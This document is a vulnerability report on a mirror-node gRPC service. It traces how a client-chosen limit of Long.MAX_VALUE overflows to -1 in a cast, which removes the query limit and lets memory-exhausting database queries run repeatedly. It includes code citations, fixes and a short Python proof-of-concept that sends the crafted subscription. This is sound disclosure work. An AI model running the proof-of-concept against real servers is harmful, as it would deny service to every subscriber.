### Title
Integer Overflow in `PollingTopicListener.poll()` Causes Unbounded Database Queries via User-Controlled `limit`

### Summary
An unprivileged gRPC client can submit a `ConsensusTopicQuery` with `limit = Long.MAX_VALUE`. Inside `PollingTopicListener.poll()`, the narrowing cast `(int)(filter.getLimit() - context.getCount().get())` overflows to `-1`, which propagates as the page size into `TopicMessageRepositoryCustomImpl.findByFilter()`. Because `hasLimit()` returns `false` for `-1`, `setMaxResults` is never called, causing every poll cycle to execute a fully unbounded database query that loads all matching topic messages into memory.

### Finding Description

**Entry point — no upper-bound on `limit`:**

`ConsensusController.toFilter()` maps the raw proto `uint64 limit` field directly to the filter with no cap:

```java
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
``` [1](#0-0) 

`TopicMessageFilter` only enforces `@Min(0)` on `limit`, so `Long.MAX_VALUE` passes validation and `hasLimit()` returns `true`. [2](#0-1) 

**Propagation to the listener:**

`TopicMessageServiceImpl.incomingMessages()` computes `limit = Long.MAX_VALUE - 0 = Long.MAX_VALUE` and passes it to `topicListener.listen(newFilter)`. [3](#0-2) 

**The overflow — root cause:**

Inside `PollingTopicListener.poll()`:

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())  // Long.MAX_VALUE → -1
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // min(-1, 5000) = -1
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build(); // limit = -1
``` [4](#0-3) 

`(int) Long.MAX_VALUE` is `-1` in Java (two's complement truncation). `Math.min(-1, 5000) = -1`. The internal `toBuilder().limit(-1).build()` call bypasses Spring's `@Validated` constraint because it is not invoked through a Spring proxy.

**Unbounded query in the repository:**

`findByFilter()` checks `filter.hasLimit()` (`limit > 0`). With `limit = -1`, this is `false`, so `setMaxResults` is never called and `getResultList()` loads every matching row into a Java `List` in memory:

```java
if (filter.hasLimit()) {
    typedQuery.setMaxResults((int) filter.getLimit()); // never reached
}
...
return typedQuery.getResultList().stream(); // unbounded
``` [5](#0-4) 

This executes on every poll interval (default 500 ms), repeated `Long.MAX_VALUE` times: [6](#0-5) 

### Impact Explanation

Every 500 ms, an unbounded `SELECT *` is issued against the `topic_message` table for the subscribed topic, with all results materialized into a Java `List`. On a topic with millions of messages this causes heap exhaustion (OOM), database connection saturation, and severe I/O pressure. Multiple concurrent subscriptions with this crafted limit multiply the effect linearly. The polling pipeline stalls or crashes, blocking delivery of all topic messages to all subscribers.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is publicly accessible with no authentication required. The exploit requires only a single gRPC call with `limit` set to `9223372036854775807` (`Long.MAX_VALUE`). Any standard gRPC client library can construct this. The attack is trivially repeatable and requires zero privileges.

### Recommendation

1. **Clamp the cast**: Before the narrowing cast, verify the remaining count fits in an `int`:
   ```java
   long remaining = filter.getLimit() - context.getCount().get();
   int limit = remaining > Integer.MAX_VALUE ? Integer.MAX_VALUE : (int) remaining;
   ```
2. **Add an upper-bound constraint** on `TopicMessageFilter.limit` (e.g., `@Max(Long.MAX_VALUE / 2)` or a domain-appropriate cap).
3. **Validate in `findByFilter`**: If `filter.getLimit()` is negative after the cast, treat it as no-limit or throw, rather than silently dropping the `setMaxResults` call.

### Proof of Concept

```python
import grpc
from hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from hederahashgraph.api.proto.java import basic_types_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_service_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1),
    limit=9223372036854775807,  # Long.MAX_VALUE
)

# Each response triggers poll(); every 500ms an unbounded SELECT fires
for msg in stub.subscribeTopic(query):
    pass
```

Observe in DB logs: repeated full-table scans on `topic_message` with no `LIMIT` clause, growing memory usage in the mirror-node JVM, and eventual OOM or severe latency degradation.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L56-56)
```java
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-41)
```java
    @Min(0)
    private long limit;

    @Min(0)
    @NotNull
    @Builder.Default
    private long startTime = DomainUtils.now();

    @Builder.Default
    private String subscriberId = RandomStringUtils.random(8, 0, 0, true, true, null, RANDOM);

    @NotNull
    private EntityId topicId;

    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L115-120)
```java
        long limit =
                filter.hasLimit() ? filter.getLimit() - topicContext.getCount().get() : 0;
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(limit).startTime(startTime).build();

        return topicListener.listen(newFilter).concatMap(t -> missingMessages(topicContext, t));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L38-43)
```java
        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L54-59)
```java
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/repository/TopicMessageRepositoryCustomImpl.java (L51-60)
```java
        if (filter.hasLimit()) {
            typedQuery.setMaxResults((int) filter.getLimit());
        }

        if (filter.getLimit() != 1) {
            // only apply the hint when limit is not 1
            entityManager.createNativeQuery(TOPIC_MESSAGES_BY_ID_QUERY_HINT).executeUpdate();
        }

        return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```
